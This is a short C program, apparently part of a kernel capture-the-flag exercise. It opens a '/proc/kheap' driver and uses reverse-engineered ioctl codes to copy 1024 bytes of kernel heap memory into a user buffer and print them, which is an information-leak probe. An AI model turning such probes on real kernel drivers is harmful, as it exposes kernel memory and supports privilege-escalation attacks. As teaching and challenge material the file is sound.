#include <fcntl.h>
#include <stdio.h>
typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

int main()
{
    char buf [1024];
    kheap_req_t kheap_req = {
        .ubuf = buf,
        .size = 1024
    }; 
    int do_print = 0x5702;
    int pre_flag = 0x5704;
    int cp_user = 0x5700;
    int cp_from_user = 0x5701;

    int fd = open("/proc/kheap", 0);

    ioctl(fd, pre_flag, &kheap_req);
    ioctl(fd, cp_user, &kheap_req);
    write(1,buf, 1024);
}